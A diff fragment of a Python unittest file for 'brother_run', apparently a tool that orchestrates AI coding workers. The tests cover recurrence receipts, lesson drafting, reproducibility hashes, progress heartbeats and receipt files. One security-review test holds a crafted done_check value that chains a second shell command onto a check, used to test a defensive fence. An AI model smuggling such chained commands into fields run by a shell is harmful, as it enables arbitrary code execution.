+        self.assertEqual(claims["SLOW1"]["state"], "done", claims)
+
+
+class TheRecurrenceLoopCloses(unittest.TestCase):
+    """P12 (persona plan row P12, 2026-09-04): after receipts_for,
+    build_report calls bm_recurrence.record_receipt per unit and drafts a
+    lesson file for every unit that did not PASS. Driven directly against
+    _br.build_report, the same seam every other test in this file already
+    uses, with a real run directory (BROTHER_RUN_DIR) and a real, scratch
+    recurrence db (BROTHERMODE_RECURRENCE_DB) so both writers actually run
+    rather than being skipped for want of a place to write."""
+
+    def setUp(self):
+        self.tmp = tempfile.mkdtemp(prefix="p12-recurrence-")
+        self.run_dir = os.path.join(self.tmp, "run1")
+        os.makedirs(self.run_dir)
+        self.db_path = os.path.join(self.tmp, "recurrence.sqlite3")
+        self._orig_run_dir = os.environ.get(journal.RUN_DIR_ENV_VAR)
+        self._orig_db = os.environ.get("BROTHERMODE_RECURRENCE_DB")
+        os.environ[journal.RUN_DIR_ENV_VAR] = self.run_dir
+        os.environ["BROTHERMODE_RECURRENCE_DB"] = self.db_path
+
+    def tearDown(self):
+        if self._orig_run_dir is None:
+            os.environ.pop(journal.RUN_DIR_ENV_VAR, None)
+        else:
+            os.environ[journal.RUN_DIR_ENV_VAR] = self._orig_run_dir
+        if self._orig_db is None:
+            os.environ.pop("BROTHERMODE_RECURRENCE_DB", None)
+        else:
+            os.environ["BROTHERMODE_RECURRENCE_DB"] = self._orig_db
+        shutil.rmtree(self.tmp, ignore_errors=True)
+
+    def _seeded_rec_and_claims(self):
+        """5 units (bm_recurrence.MIN_DENOMINATOR, so the report prints a
+        real rate rather than NO-DATA): U1 refused, U2-U5 verified. Every
+        unit gets one vault.recall journal event with one applied lesson,
+        so all five are applicable and the denominator is 5."""
+        rows = [{"id": "U1", "objective": "the one that fails",
+                 "done_check": "false", "integration_refused":
+                 "the check exited 1"}]
+        claims = {"U1": {"state": "failed"}}
+        for n in range(2, 6):
+            uid = "U%d" % n
+            rows.append({"id": uid, "objective": "unit %s" % uid,
+                        "done_check": "true", "status": "DONE",
+                        "check_passed_before": False,
+                        "files_changed_by_unit": ["f%d.py" % n]})
+            claims[uid] = {"state": "done", "evidence": {
+                "check_command": "true", "exit_code": 0}}
+        for row in rows:
+            journal.append(self.run_dir, "vault.recall", unit_id=row["id"],
+                           payload={"records": [
+                               {"slug": "lesson-for-%s" % row["id"],
+                                "path": "/vault/lesson-for-%s.md" % row["id"],
+                                "state": "applied"}]})
+        rec = {"outcome": "close the loop", "work_id": "w-p12",
+              "rows": rows}
+        return rec, claims
+
+    def test_a_seeded_run_records_one_receipt_per_unit_and_drafts_a_lesson_for_the_refused_one(self):
+        rec, claims = self._seeded_rec_and_claims()
+        report, integ, refused = _br.build_report(
+            rec, claims, "abc123", "def456", changed=[])
+        self.assertEqual(sorted(integ), ["U2", "U3", "U4", "U5"])
+        self.assertEqual([uid for uid, _ in refused], ["U1"])
+
+        # ONE RECEIPT PER UNIT: five recurrence.receipt_recorded events,
+        # one per row, and bm_recurrence's own report over the scratch db
+        # prints a real rate (5 >= MIN_DENOMINATOR), never NO-DATA.
+        events = journal.read(self.run_dir)
+        recorded = {e["unit_id"] for e in events
+                   if e["type"] == "recurrence.receipt_recorded"}
+        self.assertEqual(recorded, {"U1", "U2", "U3", "U4", "U5"})
+        bm_recurrence = _br._load_bm_recurrence()
+        self.assertIsNotNone(bm_recurrence, "bm_recurrence.py did not load")
+        proc = subprocess.run(
+            [sys.executable, os.path.join(
+                os.path.dirname(HERE), "products", "brothermode", "tools",
+                "bm_recurrence.py"), "--db", self.db_path, "report"],
+            capture_output=True, text=True)
+        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+        self.assertIn("pre-action memory application rate:", proc.stdout,
+                      proc.stdout)
+        self.assertNotIn("NO-DATA: 5 applicable", proc.stdout, proc.stdout)
+
+        # ONLY THE REFUSED UNIT DRAFTS A LESSON: the four verified units
+        # PASS and get no file, matching P12's own words ("for each refused
+        # or no-data unit").
+        lessons_dir = os.path.join(self.run_dir, "lessons")
+        names = os.listdir(lessons_dir)
+        self.assertEqual(len(names), 1, names)
+        lesson_path = os.path.join(lessons_dir, names[0])
+        with open(lesson_path, encoding="utf-8") as fh:
+            text = fh.read()
+        self.assertIn("source_receipt: run1", text, text)
+        self.assertIn("human_approved: false", text, text)
+        self.assertIn("type: failure", text, text)
+        self.assertIn("status: open", text, text)
+        self.assertIn("U1", text, text)
+
+        # THE VAULT LINTER ACCEPTS THE DRAFTED SHAPE: bm_vault_lint.py's own
+        # frontmatter contract, run against the lessons/ directory as its
+        # --vault (a temp dir, never the real Kay Vault).
+        lint = os.path.join(os.path.dirname(HERE), "products", "brothermode",
+                           "tools", "bm_vault_lint.py")
+        proc = subprocess.run([sys.executable, lint, "check", "--vault",
+                              lessons_dir], capture_output=True, text=True)
+        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+
+        # journal.append records lesson.drafted with the receipt event as
+        # its parent (P12's own words).
+        drafted = next(e for e in journal.read(self.run_dir)
+                       if e["type"] == "lesson.drafted")
+        recurrence_event = next(
+            e for e in journal.read(self.run_dir)
+            if e["type"] == "recurrence.receipt_recorded"
+            and e["unit_id"] == "U1")
+        self.assertEqual(drafted["parent_ids"], [recurrence_event["event_id"]])
+
+    def test_surfaced_names_every_recalled_state_but_applied_only_the_applied_ones(self):
+        """receipt_door.applied_memory's own three-way partition (E74):
+        surfaced is everything recalled, applied is the narrower subset a
+        recurrence rate can credit."""
+        rows = [{"id": "U1", "objective": "x", "done_check": "true",
+                "status": "DONE", "check_passed_before": False,
+                "files_changed_by_unit": ["x.py"]}]
+        claims = {"U1": {"state": "done", "evidence": {
+            "check_command": "true", "exit_code": 0}}}
+        journal.append(self.run_dir, "vault.recall", unit_id="U1",
+                       payload={"records": [
+                           {"slug": "applied-one", "path": "/v/a.md",
+                            "state": "applied"},
+                           {"slug": "stale-one", "path": "/v/s.md",
+                            "state": "stale", "line": "STALE: s.md"},
+                           {"slug": "unverified-one", "path": "/v/u.md",
+                            "state": "unverified"}]})
+        _br.build_report({"outcome": "x", "work_id": "w", "rows": rows},
+                        claims, "abc", "def", changed=[])
+        bm_recurrence = _br._load_bm_recurrence()
+        report = bm_recurrence.compute_report(self.db_path)
+        # Below MIN_DENOMINATOR (1 unit): NO-DATA is the honest report, but
+        # the row itself is readable straight from the store.
+        self.assertIsNone(report["rate"])
+        conn = bm_recurrence._connect(self.db_path)
+        try:
+            row = conn.execute(
+                "SELECT surfaced, applied FROM receipts WHERE unit_id=?",
+                ("run1:U1",)).fetchone()
+        finally:
+            conn.close()
+        self.assertIsNotNone(row, "no receipt was recorded for run1:U1")
+        surfaced = json.loads(row[0])
+        applied = json.loads(row[1])
+        self.assertEqual(sorted(surfaced),
+                         ["applied-one", "stale-one", "unverified-one"])
+        self.assertEqual(applied, ["applied-one"])
+
+    def test_build_report_called_twice_never_double_records_or_double_drafts(self):
+        """main() calls build_report twice per real run (a first pass for
+        `refused` and the cost block, then the real pass), by its own
+        comment above that call site. The recurrence loop must not record
+        two receipts or draft two lesson files for the same unit because of
+        that, or the drafted note's own minted id would differ between
+        calls and a reader could never point at "the" lesson for a unit."""
+        # Counted by TYPE, not by the run's total event count: receipt_door.
+        # receipts_for() (untouched by this row, out of scope) journals its
+        # own "receipt.issued" once per CALL, by design (E59's own comment),
+        # so a second build_report call legitimately adds one of those. This
+        # test is about idempotency of P12's own two event types only.
+        P12_TYPES = ("recurrence.receipt_recorded", "lesson.drafted")
+        rec, claims = self._seeded_rec_and_claims()
+        _br.build_report(rec, claims, "abc123", "def456", changed=[])
+        first_events = [e for e in journal.read(self.run_dir)
+                        if e["type"] in P12_TYPES]
+        first_lesson_path = os.path.join(
+            self.run_dir, "lessons",
+            os.listdir(os.path.join(self.run_dir, "lessons"))[0])
+        with open(first_lesson_path, encoding="utf-8") as fh:
+            first_lesson = fh.read()
+        _br.build_report(rec, claims, "abc123", "def456", changed=[])
+        second_events = [e for e in journal.read(self.run_dir)
+                         if e["type"] in P12_TYPES]
+        self.assertEqual(first_events, second_events,
+                         (first_events, second_events))
+        names = os.listdir(os.path.join(self.run_dir, "lessons"))
+        self.assertEqual(len(names), 1, names)
+        with open(os.path.join(self.run_dir, "lessons", names[0]),
+                 encoding="utf-8") as fh:
+            second_lesson = fh.read()
+        self.assertEqual(first_lesson, second_lesson)
+
+    def test_a_recurrence_store_failure_is_journaled_and_never_stops_the_run(self):
+        """'a db failure never stops the run (one journal line)', the
+        brief's own words: point BROTHERMODE_RECURRENCE_DB at a path whose
+        parent is a plain file, so bm_recurrence's own _connect cannot
+        os.makedirs it, and confirm build_report still returns a real
+        report rather than raising."""
+        blocked = os.path.join(self.tmp, "blocked")
+        with open(blocked, "w", encoding="utf-8") as fh:
+            fh.write("not a directory")
+        os.environ["BROTHERMODE_RECURRENCE_DB"] = os.path.join(
+            blocked, "recurrence.sqlite3")
+        rows = [{"id": "U1", "objective": "x", "done_check": "true",
+                "status": "DONE", "check_passed_before": False,
+                "files_changed_by_unit": ["x.py"]}]
+        claims = {"U1": {"state": "done", "evidence": {
+            "check_command": "true", "exit_code": 0}}}
+        report, integ, refused = _br.build_report(
+            {"outcome": "x", "work_id": "w", "rows": rows}, claims,
+            "abc", "def", changed=[])
+        self.assertEqual(integ, ["U1"])
+        self.assertIn("verdicts: 1 PASS", report, report)
+        failed = [e for e in journal.read(self.run_dir)
+                 if e["type"] == "recurrence.receipt_failed"]
+        self.assertEqual(len(failed), 1, failed)
+        self.assertEqual(failed[0]["unit_id"], "U1")
+
+
+class ReceiptIdentityFields(unittest.TestCase):
+    """P9 (persona integration plan 2026-09-04, row P9; doc 12.6 code,
+    environment and model identity; doc F14 reproducibility failure): the
+    receipt now names the target's own revision, the environment lock's
+    hash and each unit's declared data-input hashes beside the harness
+    revision it already carried, so a result can be tied to the exact code,
+    environment and data that produced it, six weeks later, or the receipt
+    says exactly which of the three was never declared."""
+
+    def _rec(self, data_inputs=None):
+        row = {"id": "U1", "done_check": "python3 a.py"}
+        if data_inputs is not None:
+            row["data_inputs"] = data_inputs
+        return {"outcome": "o", "work_id": "w", "rows": [row]}
+
+    # _env_lock, driven directly: the done-check's own words, "a temp
+    # target with a requirements.txt yielding a 64-character env_lock and
+    # one without yielding NO-DATA".
+    def test_a_requirements_file_yields_a_64_character_sha256_digest(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            with open(os.path.join(tmp, "requirements.txt"), "w",
+                     encoding="utf-8") as fh:
+                fh.write("requests==2.31.0\n")
+            env_lock = _br._env_lock(tmp)
+        self.assertEqual(len(env_lock), 64)
+        self.assertTrue(all(c in "0123456789abcdef" for c in env_lock),
+                        env_lock)
+
+    def test_a_target_with_none_of_the_four_lock_files_reads_no_data(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            env_lock = _br._env_lock(tmp)
+        self.assertTrue(env_lock.startswith("NO-DATA"), env_lock)
+        self.assertIn("none of", env_lock)
+
+    def test_no_cwd_at_all_reads_no_data_naming_that(self):
+        self.assertEqual(_br._env_lock(None),
+                         "NO-DATA: no target directory was given")
+
+    def test_the_first_lock_file_in_the_documented_order_wins(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            for name, body in (("requirements.txt", "a\n"),
+                               ("uv.lock", "b\n")):
+                with open(os.path.join(tmp, name), "w",
+                         encoding="utf-8") as fh:
+                    fh.write(body)
+            expected = hashlib.sha256(b"a\n").hexdigest()
+            self.assertEqual(_br._env_lock(tmp), expected)
+
+    # build_report, threading cwd through to receipts_for and printing the
+    # three fields on every receipt sentence.
+    def test_build_report_prints_the_targets_env_lock_hash(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            with open(os.path.join(tmp, "requirements.txt"), "w",
+                     encoding="utf-8") as fh:
+                fh.write("requests==2.31.0\n")
+            report, _, _ = _br.build_report(
+                self._rec(), {}, "abc", "def", changed=[], cwd=tmp)
+        match = re.search(r"environment lock ([0-9a-f]{64})", report)
+        self.assertIsNotNone(match, report)
+
+    def test_build_report_with_no_target_prints_env_lock_no_data(self):
+        report, _, _ = _br.build_report(
+            self._rec(), {}, "abc", "def", changed=[], cwd=None)
+        self.assertIn("environment lock NO-DATA: no target directory "
+                      "was given", report)
+
+    def test_build_report_names_target_revision_as_the_after_head(self):
+        report, _, _ = _br.build_report(
+            self._rec(), {}, "abc", "def456", changed=[], cwd=None)
+        self.assertIn("Target revision def456,", report)
+
+    def test_a_unit_with_no_data_inputs_reads_no_data_by_name(self):
+        report, _, _ = _br.build_report(
+            self._rec(), {}, "abc", "def", changed=[], cwd=None)
+        self.assertIn("data identity NO-DATA: this unit declares no "
+                      "data_inputs", report)
+
+    def test_a_declared_data_input_hashes_by_its_own_path(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            with open(os.path.join(tmp, "train.csv"), "w",
+                     encoding="utf-8") as fh:
+                fh.write("a,b\n1,2\n")
+            report, _, _ = _br.build_report(
+                self._rec(data_inputs=["train.csv"]), {}, "abc", "def",
+                changed=[], cwd=tmp)
+        match = re.search(r"data identity train\.csv=([0-9a-f]{64})", report)
+        self.assertIsNotNone(match, report)
+
+    def test_a_declared_data_input_that_does_not_exist_names_itself(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            report, _, _ = _br.build_report(
+                self._rec(data_inputs=["missing.csv"]), {}, "abc", "def",
+                changed=[], cwd=tmp)
+        self.assertIn("data identity missing.csv=NO-DATA: missing.csv "
+                      "does not exist in the target", report)
+
+
+class AFileSourcedCheckIsFencedLikeARewrittenOne(unittest.TestCase):
+    """Security review 2026-09-04, Critical: a done_check reaches
+    _reexecute_check with shell=True, and door.guard_adopted_check used to
+    stand only between a MODEL-REWRITTEN replacement and that shell. A Work
+    document is repository-supplied content on every resuming path, so a
+    record a crafted checkout ships was arbitrary shell the moment anybody
+    resumed it. These drive the fence backwards: the crafted record must be
+    refused, and a record this engine itself would have written must still
+    resume."""
+
+    CRAFTED = "python3 t.py; touch /tmp/brother-pwned-fixture"
+
+    def _run_dir(self, tmp, check):
+        run_dir = os.path.join(tmp, "runs", "docs", "plan", "runs", "r1")
+        os.makedirs(run_dir)
+        doc = os.path.join(run_dir, "work.json")
+        with open(doc, "w", encoding="utf-8") as fh:
+            json.dump({"outcome": "one file exists", "work_id": "w1", "rows": [
+                {"id": "U1", "title": "make it", "done_check": check,
+                 "owns": ["one.txt"], "depends_on": []}]}, fh)
+        return run_dir
+
+    def _resume(self, tmp, run_dir):
+        """--dry-run on purpose: brother_run stops on it immediately AFTER
+        the fence, so both sides of the drive are measured in under a second
+        instead of standing up a whole run. A test that costs three minutes
+        is a test somebody eventually skips."""
+        repo = make_repo(tmp)
+        return sh([sys.executable, BROTHER_RUN, "--resume", run_dir,
+                   "--cwd", repo, "--dry-run",
+                   "--runs-root", os.path.join(tmp, "runs")])
+
+    def test_the_helper_refuses_a_chained_check_and_names_the_unit(self):
+        record = {"rows": [{"id": "U1", "done_check": self.CRAFTED}]}
+        refusals = _br._guard_record_checks(record)
+        self.assertEqual([uid for uid, _r in refusals], ["U1"])
+        self.assertIn(";", refusals[0][1])
+        # The reason must NEVER carry the refused command back to the reader.
+        self.assertNotIn("touch", refusals[0][1])
+
+    def test_the_helper_passes_a_check_this_engine_would_have_written(self):
+        # build_prompt asks the model for "a single shell command"; a record
+        # written to that contract must keep resuming.
+        record = {"rows": [{"id": "U1", "done_check": "test -f one.txt"},
+                           {"id": "U2", "done_check": "python3 -m pytest t.py"},
+                           {"id": "U3", "done_check": "true"}]}
+        self.assertEqual(_br._guard_record_checks(record), [])
+
+    def test_resume_refuses_the_crafted_record_and_claims_nothing(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            run_dir = self._run_dir(tmp, self.CRAFTED)
+            proc = self._resume(tmp, run_dir)
+        self.assertEqual(proc.returncode, 1, proc.stdout + proc.stderr)
+        self.assertIn("U1's done_check was refused", proc.stderr)
+        self.assertIn("repository-supplied content", proc.stderr)
+        # The refused command itself is never echoed back.
+        self.assertNotIn("brother-pwned-fixture", proc.stderr)
+
+    def test_resume_still_runs_a_record_whose_checks_pass_the_fence(self):
+        """The other side of the drive: the same rig with an ordinary check
+        must get PAST the fence and reach --dry-run's own exit 0."""
+        with tempfile.TemporaryDirectory() as tmp:
+            run_dir = self._run_dir(tmp, "test -f one.txt")
+            proc = self._resume(tmp, run_dir)
+        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
+        self.assertNotIn("done_check was refused", proc.stderr)
+        self.assertNotIn("repository-supplied content", proc.stderr)
+
+class TheFirstRunLeavesAReceipt(unittest.TestCase):
+    """Row E81, reproduced from the codex EVAD trial 1 of 2026-09-04 against
+    the public v1.0.1 clone: the README's own toy delivery changed
+    mathlib.py and test_mathlib.py, the process ended, and a find over the
+    tree for a receipt file returned nothing. The delivery report went to
+    stdout and nowhere else, so a stranger who scrolled past it, or a caller
+    that only kept the exit code, was left with edited files and nothing
+    saying by whom or with what proof.
+
+    receipt_door.receipt_record() already builds the machine view of a run
+    (E72.1); nothing ever wrote it down. These pin both halves of the
+    contract: a run that wrote files leaves that record at
+    brother_run.RECEIPT_DIRNAME/RECEIPT_FILENAME under its own run
+    directory, names every changed file inside it, and prints the path as
+    its LAST stdout line; a run that cannot write one exits nonzero saying
+    so, instead of returning 0 with nothing findable."""
+
+    def setUp(self):
+        self.tmp = tempfile.mkdtemp(prefix="e81-receipt-")
+        self.repo = make_repo(self.tmp)
+        for name, body in (("mathlib.py", "def add(a, b):\n    return a + b\n"),
+                           ("test_mathlib.py",
+                            "from mathlib import add\n\n\n"
+                            "def test_add():\n    assert add(1, 2) == 3\n")):
+            with open(os.path.join(self.repo, name), "w",
+                      encoding="utf-8") as fh:
+                fh.write(body)
+        sh(["git", "add", "-A"], cwd=self.repo)
+        sh(["git", "commit", "-q", "-m", "toy"], cwd=self.repo)
+        self.decomposer = write_stub(self.tmp, "decomposer.py", """
+            import json, sys
+            sys.stdin.read()
+            print(json.dumps([
+                {"id": "G1", "objective": "guard add()",
+                 "done_check": "grep -q 'stub model' mathlib.py",
+                 "writes": ["mathlib.py"], "deps": []},
+                {"id": "G2", "objective": "cover the guard",
+                 "done_check": "grep -q 'stub model' test_mathlib.py",
+                 "writes": ["test_mathlib.py"], "deps": ["G1"],
+                 "depends_on": ["G1"]},
+            ]))
+        """)
+        self.model = write_stub(self.tmp, "writer_model.py", WRITER_MODEL)
+        self.env = dict(os.environ)
+        self.env["DOOR_MODEL_CMD"] = "%s %s" % (sys.executable, self.decomposer)
+        self.env["MODEL_WORKER_CMD"] = "%s %s" % (sys.executable, self.model)
+
+    def _run(self, env=None):
+        proc = sh([sys.executable, BROTHER_RUN,
+                  "make add() refuse non-numeric input and cover it",
+                  "--cwd", self.repo, "--runs-root", self.tmp],
+                 env=env or self.env)
+        return proc, proc.stdout + proc.stderr
+
+    def _run_dir(self):
+        runs = os.path.join(self.tmp, "docs", "plan", "runs")
+        names = sorted(os.listdir(runs))
+        self.assertEqual(len(names), 1, names)
+        return os.path.join(runs, names[0])
+
+    def test_the_last_stdout_line_names_a_receipt_file_that_exists(self):
+        proc, out = self._run()
+        self.assertEqual(proc.returncode, 0, out)
+        last = [line for line in proc.stdout.splitlines() if line.strip()][-1]
+        self.assertTrue(last.startswith("brother_run: receipt: "), out)
+        path = last.split("brother_run: receipt: ", 1)[1].strip()
+        self.assertTrue(os.path.isfile(path), out)
+        self.assertEqual(path, os.path.join(self._run_dir(),
+                                            _br.RECEIPT_DIRNAME,
+                                            _br.RECEIPT_FILENAME), out)
+
+    def test_the_receipt_names_every_file_the_run_edited(self):
+        proc, out = self._run()
+        self.assertEqual(proc.returncode, 0, out)
+        path = os.path.join(self._run_dir(), _br.RECEIPT_DIRNAME,
+                            _br.RECEIPT_FILENAME)
+        with open(path, encoding="utf-8") as fh:
+            receipt = json.load(fh)
+        named = {entry["file"] for entry in receipt["scope"]["changed"]}
+        self.assertEqual(named, {"mathlib.py", "test_mathlib.py"},
+                         json.dumps(receipt["scope"], indent=1))
+        # The printed report is inside the file, so the receipt stands
+        # alone: a reader who never saw stdout still reads what ran.
+        self.assertIn("delivery report", receipt["report"])
+
+    def test_a_receipt_that_cannot_be_written_exits_nonzero_saying_so(self):
+        """The other half: never a silent exit 0 with nothing findable. A
+        run whose receipt directory cannot be created (a plain FILE already
+        sits at that name) must say so and refuse the zero."""
+        proc, out = self._run()
+        self.assertEqual(proc.returncode, 0, out)
+        run_dir = self._run_dir()
+        shutil.rmtree(os.path.join(run_dir, _br.RECEIPT_DIRNAME))
+        with open(os.path.join(run_dir, _br.RECEIPT_DIRNAME), "w",
+                  encoding="utf-8") as fh:
+            fh.write("not a directory\n")
+        proc = sh([sys.executable, BROTHER_RUN, "--resume", run_dir,
+                  "--cwd", self.repo, "--runs-root", self.tmp], env=self.env)
+        out = proc.stdout + proc.stderr
+        self.assertNotEqual(proc.returncode, 0, out)
+        self.assertIn("brother_run: no receipt:", out, out)
+class _SlowWorker(object):
+    """A worker that does nothing except take a while, which is the only
+    property of a real worker this row is about."""
+
+    name = "the-slow-stub"
+
+    def __init__(self, seconds):
+        self.seconds = seconds
+
+    def run(self, unit, cwd=None):
+        time.sleep(self.seconds)
+        return {"status": "ok"}
+
+
+class _AlwaysGreen(object):
+    def verify(self, unit, cwd=None):
+        return {"verdict": "PASS", "reason": "the stub says so"}
+
+    def is_pass(self, verdict):
+        return (verdict or {}).get("verdict") == "PASS"
+
+
+class _NeverRepairs(object):
+    def repair(self, unit, verdict, worker, cwd=None, max_attempts=3):
+        raise AssertionError("a green unit must never reach repair")
+
+
+class TheWaitIsNarrated(unittest.TestCase):
+    """E46, the complaint verbatim: "the run is silent for eight to thirty
+    seven minutes". Measured on three real runs (499, 1517 and 2245 seconds)
+    that each printed ONE line at the start of the wait and nothing until
+    integration, so a person could not tell a working run from a hung one.
+
+    DRIVEN BACKWARDS: every assertion below fails on the pre-fix engine, where
+    run_node printed nothing at all between the worker starting and the batch
+    returning. Zero heartbeat lines is exactly the bad state, and it is what
+    these tests refuse."""
+
+    def _parts(self):
+        return {"verify": _AlwaysGreen(), "repair": _NeverRepairs()}
+
+    def test_a_three_second_worker_at_one_second_beats_names_its_unit(self):
+        """The row's own done check: a stub run with a slow worker prints at
+        least one progress line. Two are demanded, not one, because a single
+        line is what the silent engine already produced."""
+        out = io.StringIO()
+        beat = run_heartbeat.Heartbeat(interval=1.0, stream=out,
+                                       bound_seconds=900).start()
+        try:
+            record = loop_bridge.run_node({"id": "u1", "name": "the slow one"},
+                                          self._parts(), _SlowWorker(3.0))
+        finally:
+            beat.stop()
+        self.assertEqual(record["verdict"], "PASS")
+        text = out.getvalue()
+        beats = [line for line in text.splitlines()
+                 if line.startswith("brother_run: still working:")]
+        self.assertGreaterEqual(len(beats), 2, text)
+        for line in beats:
+            self.assertIn("u1", line)
+            self.assertIn("worker the-slow-stub", line)
+            self.assertIn("of at most 900s", line)
+        # The phase is the LAST one the unit reached, never a generic "busy".
+        self.assertIn("the worker is running", beats[0])
+
+    def test_each_state_change_says_so_once(self):
+        out = io.StringIO()
+        beat = run_heartbeat.Heartbeat(interval=30.0, stream=out).start()
+        try:
+            loop_bridge.run_node({"id": "u2"}, self._parts(), _SlowWorker(0.0))
+        finally:
+            beat.stop()
+        lines = [line for line in out.getvalue().splitlines()
+                 if line.startswith("brother_run: now u2")]
+        # worker, scope read, done check, finished: four transitions, and no
+        # beat could have fired inside them at a 30 second interval.
+        self.assertEqual(len(lines), 4, out.getvalue())
+        self.assertIn("done, its check passed", lines[-1])
+
+    def test_zero_seconds_is_the_old_silence(self):
+        """--quiet resolves to 0, and 0 must silence BOTH lines, not just the
+        timer: a "quiet" run that still narrated every phase change would be
+        louder than the engine this row started from."""
+        out = io.StringIO()
+        beat = run_heartbeat.Heartbeat(interval=0, stream=out).start()
+        try:
+            loop_bridge.run_node({"id": "u3"}, self._parts(), _SlowWorker(0.0))
+            self.assertEqual(beat.tick(), [])
+        finally:
+            beat.stop()
+        self.assertEqual(out.getvalue(), "")
+
+    def test_no_run_narrating_leaves_the_engine_silent(self):
+        """current() outside a run is a real Heartbeat with interval 0, so
+        every existing caller of run_node keeps its old output exactly."""
+        out = io.StringIO()
+        run_heartbeat.Heartbeat(interval=5.0, stream=out).start().stop()
+        self.assertEqual(run_heartbeat.current().interval, 0)
+        loop_bridge.run_node({"id": "u4"}, self._parts(), _SlowWorker(0.0))
+        self.assertEqual(out.getvalue(), "")
+
+    def test_a_mistyped_interval_is_refused_in_words_not_silently_obeyed(self):
+        err = io.StringIO()
+        with contextlib.redirect_stderr(err):
+            value = run_heartbeat.interval_from_env({"BROTHER_HEARTBEAT_SECONDS":
+                                                     "a minute"})
+        self.assertEqual(value, run_heartbeat.DEFAULT_INTERVAL_SECONDS)
+        self.assertIn("is not a number of seconds", err.getvalue())
+        self.assertEqual(
+            run_heartbeat.interval_from_env({"BROTHER_HEARTBEAT_SECONDS": "5"}),
+            5.0)
+
+    def test_a_beat_before_any_unit_starts_still_says_something(self):
+        beat = run_heartbeat.Heartbeat(interval=1.0, stream=io.StringIO())
+        self.assertEqual(beat.tick(),
+                         ["brother_run: still working: no piece of work has "
+                          "started yet"])
+
+
+class EarlierRunsAreMeasuredNotGuessed(unittest.TestCase):
+    """The other half of E46: the screen said only that the duration is not
+    knowable in advance. It still is not, but what earlier runs against this
+    same target really took is measured and on disk."""
+
+    def _run_dir(self, runs_root, name, target, seconds):
+        run_dir = os.path.join(runs_root, "docs", "plan", "runs", name)
+        os.makedirs(run_dir)
+        with open(os.path.join(run_dir, _br.TARGET_FILENAME), "w",
+                  encoding="utf-8") as fh:
+            json.dump({"cwd": target}, fh)
+        if seconds is not None:
+            with open(os.path.join(run_dir, _br.LOG_FILENAME), "w",
+                      encoding="utf-8") as fh:
+                fh.write("    wall_clock_seconds: %s\n" % seconds)
+        return run_dir
+
+    def test_the_last_three_finished_runs_are_read_newest_first(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            target = os.path.join(tmp, "target")
+            os.makedirs(target)
+            for name, secs in (("20260901T000000-a", 499.0),
+                               ("20260902T000000-b", 1517.2),
+                               ("20260903T000000-c", 2245.0),
+                               ("20260904T000000-d", 12.0)):
+                self._run_dir(tmp, name, target, secs)
+            got = _br.previous_run_durations(tmp, target)
+            self.assertEqual(got, [12.0, 2245.0, 1517.2])
+            self.assertIn("really took 12s, 2245s, 1517s",
+                          _br.previous_runs_line(got))
+
+    def test_a_run_against_another_target_is_never_borrowed(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            mine = os.path.join(tmp, "mine")
+            theirs = os.path.join(tmp, "theirs")
+            os.makedirs(mine)
+            os.makedirs(theirs)
+            self._run_dir(tmp, "20260901T000000-a", theirs, 499.0)
+            self.assertEqual(_br.previous_run_durations(tmp, mine), [])
+
+    def test_an_unfinished_run_carries_no_duration_and_is_not_invented(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            target = os.path.join(tmp, "target")
+            os.makedirs(target)
+            self._run_dir(tmp, "20260901T000000-a", target, None)
+            self.assertEqual(_br.previous_run_durations(tmp, target), [])
+            self.assertEqual(_br.previous_runs_line([]), "")
+
+    def test_no_runs_directory_at_all_is_empty_never_an_exception(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            self.assertEqual(_br.previous_run_durations(tmp, tmp), [])
 
 
 if __name__ == "__main__":
